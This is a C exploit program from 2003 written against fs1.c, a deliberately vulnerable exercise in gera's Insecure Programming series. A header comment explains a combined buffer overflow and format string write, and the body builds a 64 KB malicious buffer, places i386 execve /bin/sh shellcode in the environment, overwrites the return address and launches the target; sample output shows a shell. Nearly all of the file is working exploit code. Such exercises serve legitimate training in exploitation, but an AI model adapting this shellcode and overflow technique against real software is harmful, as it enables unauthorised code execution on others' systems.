/*
 * $Id: fs1-ex.c,v 1.1.1.1 2003/10/15 18:25:24 raptor Exp $
 *
 * fs1-ex.c - fs1.c exploit (gera's Insecure Programming)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Normal retloc overwrite is impossible without triggering the endless while() 
 * loop. Therefore, we are making our malicious buffer exactly 65536 (0x10000 
 * in hex notation) bytes long and make use of the printf() format string to 
 * overwrite short int var zero with 2 NULL-bytes, after the buffer overflow.
 *
 * Malicious buffer structure:
 * [A padding (256 bytes)] [ZERO (4 bytes)] [ret (65536 - (256 + 4) bytes)]
 *
 * $ uname -a
 * Linux karma 2.4.20-rc4 #1 SMP Wed Nov 27 19:21:06 CET 2002 i686 unknown
 * $ gcc --version
 * 2.95.4
 * $ ./fs1-ex
 * Using ret address       : 0xbfffffdd
 * Using zero address      : 0xbffefeda
 * [...]
 * sh-2.05a$
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define	VULN	"./fs1"			// this is the vulnerable program
#define	BUF	65536 + 1		// malicious buffer size (0x10000 + 1)
#define	ZERO	0xbffefeda		// address of variable zero on stack
#define	REST	(BUF - 1 - 256 - 4) / 4	// remaining double-words to write

char sc[] = /* linux/i386 shellcode (24 bytes) */
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main()
{
	char 	buf[BUF];
	char	*p = buf;
	int	i;

	/* put shellcode in environment */
	char 	*envp[2] = {sc, NULL};
	int	ret = 0xbffffffa - strlen(sc) - strlen(VULN);

	/* fill the vulnerable buffer */
	memset(p, 'A', 256);
	p += 256;

	/* overwrite plen with the address of zero */
	*((void **)p) = (void *)(ZERO);
	p += 4;

	/* malicious buffer must be 0x10000 bytes long */
	for (i = 0; i < REST; i++) {
		*((void **)p) = (void *)(ret);
		p += 4;
	}
	*p = 0x0;

	/* print some output */
	fprintf(stderr, "Using ret address\t: %p\n", ret);
	fprintf(stderr, "Using zero address\t: %p\n\n", ZERO);

	/* run the vulnerable program */
	execle(VULN, VULN + 2, buf, NULL, envp);
	perror("execle");
}
